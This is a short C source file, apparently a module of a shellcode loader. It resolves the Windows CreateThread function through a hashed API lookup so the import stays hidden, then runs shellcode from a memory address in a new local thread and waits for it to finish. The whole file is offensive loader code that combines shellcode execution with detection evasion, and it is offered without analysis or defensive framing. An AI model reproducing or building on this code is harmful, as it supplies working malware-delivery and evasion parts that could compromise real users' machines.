#include "../../../includes/memory/memory.h"
#include "../../../includes/apis/apis.h"
#include "../../../includes/apis/apidefs.h"
#include "../../../includes/execution/execution.h"







#ifdef EXECUTION_CREATETHREAD_LOCAL
BOOL execution_load_apis() {
	apis->CreateThread = (pCreateThread)GetProc(apis->modules.kernel32, HASHED_CREATETHREAD);
	if (apis->CreateThread == NULL) {
		return FALSE;
	}
	return TRUE;
}

BOOL execution_run(MemoryInfo memInfo) {
	HANDLE hThread = apis->CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)memInfo.ShellCodeAddress, NULL, 0, NULL);
	if (hThread == INVALID_HANDLE_VALUE) return FALSE;
	WaitForSingleObject(hThread, INFINITE);
	return TRUE;
}
#endif

